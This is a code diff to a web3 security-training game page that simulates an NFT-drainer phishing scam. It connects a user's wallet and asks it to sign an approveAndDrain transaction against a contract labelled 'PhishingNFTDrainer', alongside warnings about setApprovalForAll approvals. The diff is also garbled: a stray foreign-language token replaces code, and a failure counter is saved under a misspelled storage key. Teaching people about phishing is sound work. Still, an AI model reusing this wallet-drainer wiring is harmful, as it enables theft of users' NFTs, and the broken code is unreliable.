@@ -107,8 +107,7 @@
       <a href="level3.html" id="nextBtn">➡️ Proceed to Level 3</a>
       <div class="tooltip-box">
         💡 <strong>Did you know?</strong><br>
-        Signing an ERC721 <code>setApprovalForAll()</code> grants a contract full control over every NFT you own in a collection — instantly and permanently.<br><br>
-        This approval happens at the collection level. That means all NFTs from the same collection in your wallet can be drained — without any further confirmation.<br><br>
+        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces like OpenSea manage all your NFTs in one go, saving time and gas. Included for compatibility and efficient trading, but dangerous—approving untrusted contracts can let scammers drain your collection instantly.<br><br>
         🚨 Scammers exploit this through fake staking, animation, airdrop, and raffle dApps.<br><br>
         ⚠️ Before signing anything, triple-check which contract you're approving. One wrong click can wipe your entire collection — until you manually revoke the approval.
       </div>
@@ -120,7 +119,7 @@
       "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
       "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
     ];
-    const drainerContract = "0x05C07AEf7e8116e9933F289273299215201c7B21"; // Updated contract address
+    const drainerContract = "0xf0e2a55Cdf217c8A537D4Ee1dDf2a0816B66c56F"; // Updated PhishingNFTDrainer address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -128,8 +127,7 @@
       "function name() view returns (string)"
     ];
     const drainerABI = [
-      "function requestApprovals(address[] calldata nftContracts) external",
-      "function drainApprovedNFTs(address[] calldata nftContracts, address victim) external"
+      "function approveAndDrain(address[] calldata nftContracts) external"
     ];
 
     let provider, signer;
@@ -171,37 +169,34 @@
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Requesting approvals for multiple collections...";
+        status.innerText = "🚨 Approving and draining NFTs...";
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
-        const approveTx = await drainer.requestApprovals(nftContracts); // Bulk approval in one tx
-        await approveTx.wait();
+        const tx = await drainer.approveAndDrain(nftContracts); // Single tx for approval and draining
+        await tx.wait();
 
-        status.innerText = "💀 Approvals granted. Draining now...";
-        const user = await signer.getAddress();
-        const drainTx = await drainer.drainApprovedNFTs(nftContracts, user);
-        await drainTx.wait();
+       察觉
 
         status.innerText =
-          "💀 All NFTs from the approved collections were transferred to the attacker.\n\n" +
-          "🧠 Lesson: Approving a malicious contract with `setApprovalForAll` for multiple collections in one transaction can wipe out your NFTs instantly.\n\n" +
-          "Never sign blanket approvals unless absolutely necessary.";
+          "💀 All NFTs from the approved collections were drained!\n\n" +
+          "🧠 Lesson: Signing a malicious transaction can approve and drain your NFTs instantly. " +
+          "Never trust unknown sites—check contracts before signing!";
         localStorage.setItem("w3game_level2", "drained");
         let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
-        localStorage.setItem("w3game_failed", failCount + 1);
+        localStorage.setItem("w168ame_failed", failCount + 1);
         updateCounters();
         document.getElementById("nextBtn").style.display = "inline-block";
       } catch (err) {
         if (err.code === "ACTION_REJECTED") {
           status.innerText =
-            "✅ You survived Level 2!\n\n🛡️ You rejected a malicious `setApprovalForAll` request for multiple collections.\n\n" +
-            "This would have allowed a contract to move every NFT from these collections without asking again.";
+            "✅ You survived Level 2!\n\n🛡️ You rejected a malicious transaction that would have approved and drained all your NFTs in one go. " +
+            "Always verify contracts before signing!";
           let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
           localStorage.setItem("w3game_survived", surviveCount + 1);
           updateCounters();
           document.getElementById("nextBtn").style.display = "inline-block";
         } else {
           console.error(err);
-          status.innerText = "⚠️ Unexpected error occurred.";
+          status.innerText = "⚠️ Unexpected error occurred: " + err.message;
         }
       }
     };
